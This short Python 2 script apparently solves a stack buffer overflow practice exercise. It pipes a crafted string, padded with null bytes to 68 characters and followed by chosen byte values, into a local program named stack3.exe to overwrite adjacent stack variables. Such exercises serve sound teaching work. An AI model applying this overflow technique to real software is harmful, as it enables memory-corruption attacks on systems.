import os

StdIn,StdOut = os.popen4(r".\stack3.exe")

XploitString = "Macho lo venci"
XploitString += "\x00" * (68 - len(XploitString)) + "tsrq" + "\x00" * 4 + "\x05\x00\x02\x01" + '\n'
print XploitString

StdIn.write(XploitString)
StdIn.close()

print StdOut.read()
